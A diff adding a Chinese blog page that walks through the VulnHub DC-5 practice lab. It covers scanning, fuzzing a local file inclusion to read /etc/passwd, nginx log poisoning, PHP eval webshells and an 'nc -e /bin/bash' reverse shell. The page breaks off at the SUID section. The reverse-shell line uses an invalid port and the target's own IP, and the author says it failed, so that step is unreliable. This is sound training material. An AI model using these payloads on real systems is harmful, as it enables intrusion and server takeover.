@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——vulnhub靶场之DC-5 | MS02423</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——vulnhub靶场之DC-5`
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="MS02423" type="application/atom+xml">
+</head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="http://ms02423.top/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://ms02423.top/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://ms02423.top/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://ms02423.top/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"DVWA之SQL注入","path":"2023/06/30/DVWA之SQL注入/"},{"title":"OtterCTF-2018-General","cover":"/imgs/2.jpg","path":"2023/07/20/OtterCTF-2018-General/"},{"title":"vulnhub靶场之DC-3","cover":"/imgs/7.jpg","path":"2023/10/23/vulnhub靶场之DC-3/"},{"title":"vulnhub靶场之DC:1","cover":"/imgs/5.jpg","path":"2023/09/25/vulnhub靶场之DC-1/"},{"title":"vulnhub靶场之DC-2","cover":"/imgs/6.jpg","path":"2023/10/13/vulnhub靶场之DC-2/"},{"title":"内存取证练习题","cover":"/imgs/3.jpg","path":"2023/07/25/内存取证练习题/"},{"title":"图片隐写","cover":"/imgs/4.jpg","path":"2023/08/08/图片隐写/"},{"title":"陇剑杯-2021-内存分析","cover":"/imgs/1.jpg","path":"2023/07/18/陇剑杯-2021-内存分析/"},{"title":"红日靶场(一)","path":"2023/07/17/红日靶场-一/"},{"title":"vulnhub靶场之DC-4","cover":"/imgs/8.jpg","path":"2023/11/01/vulnhub靶场之DC-4/"},{"title":"vulnhub靶场之DC-5","cover":"/imgs/9.jpg","path":"2023/12/25/vulnhub靶场之DC-5/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">MS02423.</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">音乐</span>
+          <span class="main-left--tag">旅行</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“花自向阳开，人终向前走”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/zb423"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>3</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>5</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>7 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>11 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>214天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <style>
+pre::-webkit-scrollbar {
+  width: 5px;
+  height: 10px;
+  background-color:#F5F5F5;
+}
+/*定义滚动条轨道
+内阴影+圆角*/
+pre::-webkit-scrollbar-track {
+  background-color:#F5F5F5;
+}
+/*定义滑块
+内阴影+圆角*/
+pre::-webkit-scrollbar-thumb {
+  background-color: rgb(69, 83, 100);
+}
+
+pre:active {
+  background-color: rgb(81, 95, 116);
+}
+</style>
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">vulnhub靶场之DC-5</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+    
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">2,066字</span>
+      </span>
+    </span>
+    &nbsp; | &nbsp;
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">9分</span>
+      </span>
+    </span>
+</div> 
+                
+          <div class="article-info--categories">
+            <span>分类：</span>
+            <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            <a class="tag-link" href="/tags/vulnhub%E9%9D%B6%E5%9C%BA/" rel="tag">vulnhub靶场</a>
+          </div>
+          
+          <p class="article-info--date">日期：2023-12-25 13:58:04</p>
+        </div>
+        <img src="/imgs/9.jpg" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content">
+      <h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-5 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>
+The plan was <span class="token keyword">for</span> DC-5 <span class="token keyword">to</span> kick it <span class="token keyword">up</span> a notch<span class="token punctuation">,</span> so this might <span class="token operator">not</span> be great <span class="token keyword">for</span> beginners<span class="token punctuation">,</span> but should be ok <span class="token keyword">for</span> people <span class="token keyword">with</span> intermediate <span class="token operator">or</span> better experience<span class="token punctuation">.</span> <span class="token keyword">Time</span> will tell <span class="token punctuation">(</span><span class="token keyword">as</span> will feedback<span class="token punctuation">)</span><span class="token punctuation">.</span>
+<span class="token keyword">As</span> far <span class="token keyword">as</span> I am aware<span class="token punctuation">,</span> there <span class="token keyword">is</span> only one exploitable <span class="token keyword">entry</span> point <span class="token keyword">to</span> get <span class="token keyword">in</span> <span class="token punctuation">(</span>there <span class="token keyword">is</span> <span class="token keyword">no</span> SSH either<span class="token punctuation">)</span><span class="token punctuation">.</span> This particular <span class="token keyword">entry</span> point may be quite hard <span class="token keyword">to</span> identify<span class="token punctuation">,</span> but it <span class="token keyword">is</span> there<span class="token punctuation">.</span> You need <span class="token keyword">to</span> look <span class="token keyword">for</span> something a little out <span class="token keyword">of</span> the ordinary <span class="token punctuation">(</span>something that changes <span class="token keyword">with</span> a refresh <span class="token keyword">of</span> a <span class="token keyword">page</span><span class="token punctuation">)</span><span class="token punctuation">.</span> This will hopefully provide some kind <span class="token keyword">of</span> idea <span class="token keyword">as</span> <span class="token keyword">to</span> what the vulnerability might involve<span class="token punctuation">.</span>
+<span class="token operator">And</span> <span class="token keyword">just</span> <span class="token keyword">for</span> the <span class="token keyword">record</span><span class="token punctuation">,</span> there <span class="token keyword">is</span> <span class="token keyword">no</span> phpmailer exploit involved<span class="token punctuation">.</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token punctuation">)</span>
+The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>
+Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span>
+<span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span>
+But <span class="token keyword">if</span> you're really<span class="token punctuation">,</span> really stuck<span class="token punctuation">,</span> you can watch this video which shows the <span class="token keyword">first</span> step<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>只有一个flag</p>
+<h2 id="2-下载靶场环境"><a href="#2-下载靶场环境" class="headerlink" title="2.下载靶场环境"></a>2.下载靶场环境</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-5<span class="token punctuation">,</span><span class="token number">314</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>下载下来的文件</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140237807.png" alt="image-20231225140237807"></p>
+<h2 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140411377.png" alt="image-20231225140411377"></p>
+<p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p>
+<h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p>
+<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶机真实IP"><a href="#1-寻找靶机真实IP" class="headerlink" title="(1)寻找靶机真实IP"></a>(1)寻找靶机真实IP</h3><p>使用nmap进行探活，寻找靶机ip</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -sP <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140707890.png" alt="image-20231225140707890"></p>
+<p>也可以使用arp-scan进行探活，寻找靶机ip</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140851823.png" alt="image-20231225140851823"></p>
+<p>本机ip为192.168.52.152<br>所以分析可得靶机ip为192.168.52.136</p>
+<h3 id="2-探端口及服务"><a href="#2-探端口及服务" class="headerlink" title="(2)探端口及服务"></a>(2)探端口及服务</h3><p>使用nmap探活端口</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -A -v -p- <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.136</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141324344.png" alt="image-20231225141324344"></p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，存在web服务，nginx <span class="token number">1.6</span><span class="token number">.2</span>
+发现开放了<span class="token number">111</span>端口，rpcbind 2-4
+发现开放了<span class="token number">58694</span>端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>也可以使用masscan探活端口<br>masscan –rate&#x3D;10000 –ports 0-65535 192.168.52.136</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141551024.png" alt="image-20231225141551024"></p>
+<h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141800642.png" alt="image-20231225141800642"></p>
+<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web访问"><a href="#1-访问web访问" class="headerlink" title="(1)访问web访问"></a>(1)访问web访问</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141852497.png" alt="image-20231225141852497"></p>
+<p>发现有一个留言板，随便输入一下并提交</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142008963.png" alt="image-20231225142008963"></p>
+<p>提交完成之后发现切入点,页面跳转到Thankyou.php，并且在URL地址栏可以看到参数，GET方式传参</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142106629.png" alt="image-20231225142106629"></p>
+<p>突然发现这儿变成2018了，之前好像是2019</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142225101.png" alt="image-20231225142225101"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142240133.png" alt="image-20231225142240133"></p>
+<p>琢磨琢磨，最后发现，只要一刷新页面，就会变，猜想存在文件包含</p>
+<h3 id="2-bp是否存在文件包"><a href="#2-bp是否存在文件包" class="headerlink" title="(2)bp是否存在文件包"></a>(2)bp是否存在文件包</h3><p>使用BurpSuite抓包，爆破后台页面，由于是php站，我们选择php字典</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142954512.png" alt="image-20231225142954512"></p>
+<p>导入一个php字典，进行爆破</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225143207510.png" alt="image-20231225143207510"></p>
+<p>发现存在index.php，solutions.php，about-us.php，faq.php，contact.php，thankyou.php，footer.php七个页面</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144602625.png" alt="image-20231225144602625"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144449486.png" alt="image-20231225144449486"></p>
+<p>打开这几个页面，发现发开footer.php时，不断刷新，图标也在不断地变化，确认文件包含页面是footer.php</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144652807.png" alt="image-20231225144652807"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144708976.png" alt="image-20231225144708976"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144730198.png" alt="image-20231225144730198"></p>
+<h3 id="3-Fuzz确认存在文件包含漏洞"><a href="#3-Fuzz确认存在文件包含漏洞" class="headerlink" title="(3)Fuzz确认存在文件包含漏洞"></a>(3)Fuzz确认存在文件包含漏洞</h3><p>使用BurpSuite爆破文件包含的变量名即可能被包含的值</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.136</span><span class="token operator">/</span>thankyou<span class="token punctuation">.</span>php?<span class="token keyword">page</span><span class="token operator">=</span>footer<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>选择草叉模式进行爆破，选择两个爆破点，一个是文件包含变量名，一个是包含值</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152459936.png" alt="image-20240105152459936"></p>
+<p>导入第一个字典，变量名字典</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152539472.png" alt="image-20240105152539472"></p>
+<p>导入第二个字典（passwd路径字典）</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152615556.png" alt="image-20240105152615556"></p>
+<p>成功爆破出八对值，但是只有一个变量名</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152650601.png" alt="image-20240105152650601"></p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>thankyou<span class="token punctuation">.</span>php?<span class="token keyword">file</span><span class="token operator">=</span>%2e%2e%2fetc%2fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>访问最短的吧路径，成功包含到字典</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.52.136/thankyou.php?file=/etc/passwd">http://192.168.52.136/thankyou.php?file=%2fetc%2fpasswd</a> </p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152834883.png" alt="image-20240105152834883"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.52.136/thankyou.php?file=/etc/passwd">http://192.168.52.136/thankyou.php?file=/etc/passwd</a></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152905401.png" alt="image-20240105152905401"></p>
+<h3 id="4-确认日志文件的位置"><a href="#4-确认日志文件的位置" class="headerlink" title="(4)确认日志文件的位置"></a>(4)确认日志文件的位置</h3><p>由于前面信息收集我们确认了是nginx的站，访问日志和错误日志应该如下<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/102956230">Web日志目录及日志分析</a></p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">access</span><span class="token punctuation">.</span>log
+<span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">error</span><span class="token punctuation">.</span>log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>包含看一下</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153221281.png" alt="image-20240105153221281"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153250716.png" alt="image-20240105153250716"></p>
+<h3 id="5-写入一句话木马"><a href="#5-写入一句话木马" class="headerlink" title="(5)写入一句话木马"></a>(5)写入一句话木马</h3><h4 id="1-写入phpinfo"><a href="#1-写入phpinfo" class="headerlink" title="1)写入phpinfo"></a>1)写入phpinfo</h4><p>写入phpinfo,访问如下日志文件，使用burpsuite抓包</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153616786.png" alt="image-20240105153616786"></p>
+<p>我们使用burp进行抓包，在burp中写入一句话木马</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">GET <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>;?<span class="token operator">></span> HTTP<span class="token operator">/</span><span class="token number">1.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>没有写入之前</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153818491.png" alt="image-20240105153818491"></p>
+<p>写入之后</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153949605.png" alt="image-20240105153949605"></p>
+<p>重新打开日志文件可以看到成功写入，成功回显出phpinfo信息</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105154051732.png" alt="image-20240105154051732"></p>
+<h4 id="2-写入webshell"><a href="#2-写入webshell" class="headerlink" title="2)写入webshell"></a>2)写入webshell</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span>$_POST[<span class="token string">'ms02423'</span>]<span class="token punctuation">)</span>;?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>由于一些原因，靶机ip地址由192.168.52.136变成了192.168.52.128</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105194739666.png" alt="image-20240105194739666"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105194755495.png" alt="image-20240105194755495"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105194924650.png" alt="image-20240105194924650"></p>
+<p>IP地址192.168.52.128</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195240841.png" alt="image-20240105195240841"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195259596.png" alt="image-20240105195259596"></p>
+<p>3)连接蚁剑</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195327992.png" alt="image-20240105195327992"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195340657.png" alt="image-20240105195340657"></p>
+<h4 id="3-新建shell文件"><a href="#3-新建shell文件" class="headerlink" title="3)新建shell文件"></a>3)新建shell文件</h4><p>可以在服务器&#x2F;tmp目录下新建一个webshell.php文件，写入一句话木马并重新连接</p>
+<p>右键在tmp目录下新建php文件，名称为webshell.php</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195728613.png" alt="image-20240105195728613"></p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">欢迎访问webshell页面!!! 
+<span class="token operator">&lt;</span>?php 
+@eval<span class="token punctuation">(</span>$_REQUEST[powershell]<span class="token punctuation">)</span> 
+?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195937931.png" alt="image-20240105195937931"></p>
+<h4 id="4-我们访问新的页面"><a href="#4-我们访问新的页面" class="headerlink" title="4)我们访问新的页面"></a>4)我们访问新的页面</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200153964.png" alt="image-20240105200153964"></p>
+<h4 id="5-蚁剑连接新的webshell"><a href="#5-蚁剑连接新的webshell" class="headerlink" title="5)蚁剑连接新的webshell"></a>5)蚁剑连接新的webshell</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200328616.png" alt="image-20240105200328616"></p>
+<p>连接成功右键进入虚拟终端</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200452842.png" alt="image-20240105200452842"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200511440.png" alt="image-20240105200511440"></p>
+<h3 id="6-反弹shell到kali"><a href="#6-反弹shell到kali" class="headerlink" title="(6)反弹shell到kali"></a>(6)反弹shell到kali</h3><p>蚁剑终端不如kali终端，我们反弹shell到kali(这里我没有成功，不知道什么原因)</p>
+<p>我们在kali里面终端输入</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nc -lnvp <span class="token number">666666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们在蚁剑虚拟终端输入</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nc -e <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.128</span> <span class="token number">666666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="4-suid提权"><a href="#4-suid提权" class="headerlink" title="4.suid提权"></a>4.suid提权</h2><p>使用find命令，查找具有suid权限的命令</p>
